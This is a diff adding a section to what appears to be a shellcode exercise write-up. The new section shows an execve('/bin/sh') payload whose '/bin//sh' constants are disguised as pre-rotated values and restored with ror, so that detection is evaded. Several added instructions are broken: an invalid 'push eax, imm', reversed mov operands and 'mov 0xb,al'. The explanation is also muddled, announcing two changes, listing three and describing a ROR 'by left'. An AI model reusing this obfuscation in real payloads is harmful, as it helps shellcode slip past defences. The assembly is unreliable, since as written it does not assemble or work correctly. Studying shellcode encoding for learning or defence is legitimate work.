@@ -25,3 +25,44 @@ This is an execve("/bin/sh") of 28 byte. Let's check the assembly code.
  804807a: cd 80                 int    $0x80
  ```
  
+ So the modified code looks as follows :
+
+ ```
+global _start
+
+section .text
+
+_start: 
+
+xor    eax, eax      ; zero our eax
+push   eax
+
+; push   0x68732f2f
+
+mov eax, 0xd0e65e5e
+ror eax, 1			 ; shift the register by 1 ro right
+push eax
+
+; push   0x6e69622f
+push eax, 0xdcd2c45e
+ror eax, 1			 ; shift the register by 1 ro right
+push eax
+
+mov    esp,ebx
+mov    eax,ecx
+mov    eax,edx
+mov    0xb,al
+int    0x80
+
+; End section for exit call
+xor    eax,eax
+inc    eax
+int    0x80
+ ```
+ 
+ Here I have done two few changes to the code : 
+ 
+ 1) The eax register for both 0x68732f2f and 0x6e69622f are first brought to it's original form by first ROR the register by left.
+ 2) For this research, I have used bit shift calculator and shifted the accumulator by 1.
+ 3) Use the same method, I have added ror by 1 to shift the register back to it's original form to perform execve.
+
